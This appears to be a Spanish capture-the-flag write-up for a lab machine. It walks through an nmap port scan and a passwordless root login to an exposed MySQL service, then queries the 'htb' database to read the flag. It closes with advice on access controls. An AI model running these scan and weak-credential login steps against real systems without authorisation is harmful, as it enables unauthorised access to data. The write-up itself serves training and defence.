----------------
- Tags: #vulnerabilidad #database #mysql #sql #reconocimiento #weakcredentials 
------------------

![](../img/d7423e40853f5444ca382dbde26e3cd2.png).

![](../img/1cbe585764ed4542eb5a070f286ea7dd.png)

Comenzamos identificando servicios abiertos con un escaneo rápido:

```bash
nmap -p- --min-rate 5000 -T4 -n -Pn 10.129.131.179
```

![](../img/293f9c68e20638cbec41978f7ec9e6f0.png)

Vemos que el puerto abierto es el **3306**, correspondiente al servicio **MySQL**.

## 🔐 Conexión al servicio MySQL

Nos conectamos directamente con `mysql` como usuario `root`, sin contraseña:

```bash
mysql -h 10.129.131.179 -u root 
```

Accedemos correctamente. Desde el monitor de MariaDB, exploramos las bases de datos:

![](../img/d6008227f015c174f3a62df444f86c8d.png)

```bash
SHOW DATABASES;
```

Identificamos una base de datos que no es del sistema: **htb**

![](../img/f6783acea00a3994af798b9268e25e20.png)

## 📂 Exploración de la base de datos `htb`

Seleccionamos la base de datos:

```bash
USE htb;
```

![](../img/978497a4f4f87012e1b531ee61fe79d0.png)

Comprobamos qué tablas contiene:

```bash
SHOW TABLES;
```

![](../img/20e60c6590a02ccd9466d779e8365db6.png)

La tabla **config** llama la atención, así que la consultamos:

```bash
SELECT * FROM config;
```

![](../img/c4af0006089880ab517b6b8d9b93290f.png)

En la columna `value`, dentro de la fila `flag`, encontramos la flag.

📌 **Flag encontrada:**

## ✅ Conclusión final

- Se expone un servicio de **MySQL sin contraseña** para el usuario root, lo que representa una gran vulnerabilidad.
    
- Mediante conexión directa, se accede a la base de datos `htb` y se consulta su contenido.
    
- La flag se encuentra fácilmente en la tabla `config`.
    

🧠 **Lección aprendida:** Nunca se debe dejar un servicio de base de datos accesible desde fuera y menos aún sin autenticación. Es fundamental aplicar controles de acceso estrictos y reglas de firewall adecuadas.
